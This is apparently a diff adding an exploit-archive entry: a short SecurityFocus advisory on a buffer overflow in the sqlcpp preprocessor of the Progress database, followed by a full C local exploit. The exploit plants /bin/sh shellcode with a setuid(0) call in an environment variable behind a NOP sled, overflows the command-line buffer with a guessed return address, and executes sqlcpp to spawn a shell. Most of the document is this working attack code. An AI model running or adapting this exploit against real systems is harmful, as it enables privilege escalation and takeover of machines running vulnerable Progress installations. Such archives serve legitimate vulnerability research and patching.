@@ -1,0 +1,99 @@
+source: http://www.securityfocus.com/bid/4402/info
+
+Progress is a commercial database for Microsoft Windows and Unix systems.
+
+A buffer overflow has been reported in the sqlcpp program included with Progress, used as a SQL preprocessor. Execution of arbitrary code is possible.
+
+This issue has been reported to affect Unix systems. This vulnerability may also exist under Windows, this has not however been confirmed.
+
+/*
+ * Yet another Progress Database exploit (version ??)
+ *
+ * The vulnerability was found by KF / Snosoft (http://www.snosoft.com)
+ * Exploit coded up by The Itch / Promisc (http://www.promisc.org)
+ *
+ * This exploit was developed on the Snosoft vulnerability research machines
+ * mail dotslash@snosoft.com if you are interested in contributing research time
+ *
+ * - The Itch
+ * - itchie@promisc.org
+ *
+ * - Technical details concerning the exploit -
+ *
+ * 1). Buffer overflow occurs after writing more then 56 bytes into the buffer at the command line
+ *     (56 to overwrite ebp, 60 to overwrite eip).
+ * 2). If you write more then 65 bytes, other frames will be overwritten afterwards and will mess up
+ *     your flow of arbitrary code execution.
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+
+#define DEFAULT_EGG_SIZE 2048
+#define NOP 0x90
+
+#define DEFAULT_BUFFER_SIZE 60
+
+char shellcode[] =
+        "\x31\xc0\x31\xdb\xb0\x17\xcd\x80"
+        "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+        "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+        "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+int main(int argc, char *argv[])
+{
+        char *buff;
+        char *egg;
+        char *ptr;
+        long *addr_ptr;
+        long addr;
+        int bsize = DEFAULT_BUFFER_SIZE;
+        int eggsize = DEFAULT_EGG_SIZE;
+        int i;
+        int get_sp = (int)&get_sp;
+
+        if(argc > 1) { bsize = atoi(argv[1]); }
+
+        if(!(buff = malloc(bsize)))
+        {
+                printf("unable to allocate memory for %d bytes\n", bsize);
+                exit(1);
+        }
+
+        if(!(egg = malloc(eggsize)))
+        {
+                printf("unable to allocate memory for %d bytes\n", eggsize);
+                exit(1);
+        }
+
+        printf("/usr/dlc/bin/sqlcpp\n");
+        printf("Vulnerability found by KF / http://www.snosoft.com\n");
+        printf("Coded by The Itch / http://www.promisc.org\n\n");
+        printf("Using return address: 0x%x\n", get_sp);
+        printf("Using buffersize    : %d\n", bsize);
+
+        ptr = buff;
+        addr_ptr = (long *) ptr;
+        for(i = 0; i < bsize; i+=4) { *(addr_ptr++) = get_sp; }
+
+        ptr = egg;
+        for(i = 0; i < eggsize - strlen(shellcode) -1; i++)
+        {
+                *(ptr++) = NOP;
+        }
+
+        for(i = 0; i < strlen(shellcode); i++)
+        {
+                *(ptr++) = shellcode[i];
+        }
+
+        egg[eggsize - 1] = '\0';
+        memcpy(egg, "EGG=", 4);
+        putenv(egg);
+
+        execl("/usr/dlc/sqlcpp", "sqlcpp", buff, 0);
+
+        return 0;
+}
+
+
